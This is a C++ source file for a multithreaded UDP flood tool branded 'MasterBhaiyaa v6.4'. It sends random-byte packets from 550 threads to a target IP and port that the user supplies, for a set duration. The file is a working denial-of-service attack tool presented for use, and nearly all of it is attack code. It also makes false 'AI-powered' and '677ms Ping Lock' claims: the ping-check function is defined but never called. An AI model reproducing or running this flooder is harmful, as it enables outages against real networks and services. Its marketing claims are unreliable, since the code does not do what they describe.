#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <atomic>
#include <csignal>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <random>

#define FIXED_THREADS 550
#define DEFAULT_PAYLOAD_SIZE 24
#define BINARY_NAME "MasterBhaiyaa"
#define TARGET_PING 677
#define PING_CHECK_INTERVAL 2

std::atomic<bool> stop_flag(false);

struct AttackConfig {
    std::string ip;
    int port;
    int duration;
    int payload_size;
};

// Signal handler
void handle_signal(int signal) {
    std::cout << "\n[!] Stopping AI UDP attack...\n";
    stop_flag = true;
}

// Validate IP Address
bool is_valid_ip(const std::string &ip) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr)) != 0;
}

// Generate AI-based random payload
void generate_payload(std::vector<uint8_t> &buffer, size_t size) {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<uint8_t> dis(0, 255);

    buffer.resize(size);
    for (size_t i = 0; i < size; i++) {
        buffer[i] = dis(gen);
    }
}

// Check target ping
int get_target_ping(const std::string &target_ip) {
    std::string command = "ping -c 1 -W 1 " + target_ip + " | grep 'time=' | awk -F'=' '{print $NF}' | awk '{print int($1)}'";
    FILE *pipe = popen(command.c_str(), "r");
    if (!pipe) return -1;

    char buffer[16];
    fgets(buffer, sizeof(buffer), pipe);
    pclose(pipe);

    int ping = atoi(buffer);
    return (ping > 0) ? ping : 800;
}

// UDP Attack Function (Fixed 550 Threads)
void udp_attack(const AttackConfig &config) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;
    fcntl(sock, F_SETFL, O_NONBLOCK);

    sockaddr_in target_addr = {};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config.port);
    target_addr.sin_addr.s_addr = inet_addr(config.ip.c_str());

    std::vector<uint8_t> payload;
    generate_payload(payload, config.payload_size);

    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);

    while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
        for (int i = 0; i < 10; i++) {
            sendto(sock, payload.data(), payload.size(), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
        }
        generate_payload(payload, config.payload_size);
    }

    close(sock);
}

// Main function
int main(int argc, char *argv[]) {
    if (argc < 4 || argc > 5) {
        std::cerr << "Usage: ./MasterBhaiyaa <ip> <port> <duration> [payload_size]\n";
        return EXIT_FAILURE;
    }

    AttackConfig config;
    config.ip = argv[1];
    config.port = std::stoi(argv[2]);
    config.duration = std::stoi(argv[3]);
    config.payload_size = (argc == 5) ? std::stoi(argv[4]) : DEFAULT_PAYLOAD_SIZE;

    if (!is_valid_ip(config.ip)) {
        std::cerr << "Invalid IP address: " << config.ip << "\n";
        return EXIT_FAILURE;
    }

    std::signal(SIGINT, handle_signal);

    std::cout << "🔥 MasterBhaiyaa v6.4 - AI UDP (Fixed 550 Threads & 677ms Ping Lock) 🔥\n";
    std::cout << "© 2024-2054 @MasterBhaiyaa\n";
    std::cout << "=====================================\n";
    std::cout << "Target: " << config.ip << ":" << config.port << "\n";
    std::cout << "Duration: " << config.duration << " sec\n";
    std::cout << "Threads: " << FIXED_THREADS << "\n";
    std::cout << "Payload Size: " << config.payload_size << " bytes\n";
    std::cout << "Target Ping: " << TARGET_PING << " ms (AI-Controlled)\n";
    std::cout << "=====================================\n\n";

    std::vector<std::thread> threads;
    for (int i = 0; i < FIXED_THREADS; ++i) {
        threads.emplace_back(udp_attack, config);
    }

    for (auto &thread : threads) {
        thread.join();
    }

    stop_flag = true;

    std::cout << "\n[✔] AI-Powered UDP attack completed.\n";
    std::cout << "© @MasterBhaiyaa\n";

    return EXIT_SUCCESS;
}
